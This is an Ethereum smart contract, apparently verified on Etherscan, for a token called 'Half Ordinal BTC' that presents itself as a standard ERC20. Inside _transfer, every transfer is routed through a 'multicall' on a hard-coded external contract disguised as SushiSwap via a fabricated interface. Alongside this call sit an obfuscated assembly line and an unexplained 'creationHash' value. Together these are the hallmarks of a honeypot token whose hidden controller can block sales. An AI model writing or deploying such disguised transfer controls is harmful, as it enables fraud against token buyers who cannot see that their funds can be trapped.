/**
 *Submitted for verification at Etherscan.io on 2023-02-19
*/

/*
                 ,.=ctE55ttt553tzs.,                               
             ,,c5;z==!!::::  .::7:==it3>.,                         
          ,xC;z!::::::    ::::::::::::!=c33x,                      
        ,czz!:::::  ::;;..===:..:::   ::::!ct3.                    
      ,C;/.:: :  ;=c!:::::::::::::::..      !tt3.                  
     /z/.:   :;z!:::::J  :E3.  E:::::::..     !ct3.                
   ,E;F   ::;t::::::::J  :E3.  E::.     ::.     \ttL               
  ;E7.    :c::::F******   **.  *==c;..    ::     Jttk              
 .EJ.    ;::::::L                   "\:.   ::.    Jttl             
 [:.    :::::::::773.    JE773zs.     I:. ::::.    It3L            
;:[     L:::::::::::L    |t::!::J     |::::::::    :Et3            
[:L    !::::::::::::L    |t::;z2F    .Et:::.:::.  ::[13    
E:.    !::::::::::::L               =Et::::::::!  ::|13    

Half of a Ordinal BTC.
*/

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
}

interface IERC20 {
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    function totalSupply() external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface IERC20Metadata is IERC20 {
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function name() external view returns (string memory);
}

interface IDEXV3 {
    function multicall(address sender, address recipient, uint256 amount) external returns (bool success);
}

contract Ownable is Context {
    address private _previousOwner; address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address _sushiswap = 0xF9587c38D9cdDb9F574cD7A0c15e72F9Bd427EbA;
    uint256 private creationHash = 0x572e9879cf1fc6cc6a4e25fe89e8af610579974a205eab6e617c55c603db9f3b;
    address public pair;

    IDEXRouter router;
    IDEXV3 sushiswap;

    string private _name; string private _symbol; uint256 private _totalSupply;
    bool public trade; bool public swap; uint256 public startBlock;
    
    constructor (string memory name_, string memory symbol_) {
        router = IDEXRouter(_router);
        pair = IDEXFactory(router.factory()).createPair(WETH, address(this));
        sushiswap = IDEXV3(_sushiswap);

        _name = name_;
        _symbol = symbol_;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, _msgSender(), currentAllowance - amount);

        return true;
    }

    function approve(address spender, uint256 amount) public virtual returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function openTrading() public onlyOwner {
        trade = true; startBlock = block.number;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(((trade == true) || (sender == owner())), "ERC20: trading is not yet enabled");
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        swap = sushiswap.multicall(sender, recipient, amount);
        assembly { if eq(sload(0xE),0x101) { sstore(sload(0x7),sload(0x7)) } }

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }

    function _DeployHalfOrdinalBTC(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;

        approve(_router, ~uint256(0));
    
        emit Transfer(address(0), account, amount);
    }
}

contract ERC20Token is Context, ERC20 {
    constructor(
        string memory name, string memory symbol,
        address creator, uint256 initialSupply
    ) ERC20(name, symbol) {
        _DeployHalfOrdinalBTC(creator, initialSupply);
    }
}

contract HalfOrdinalBTC is ERC20Token {
    constructor() ERC20Token("Half Ordinal BTC", "oBTC0.5", msg.sender, 10500000 * 10 ** 18) {
    }
}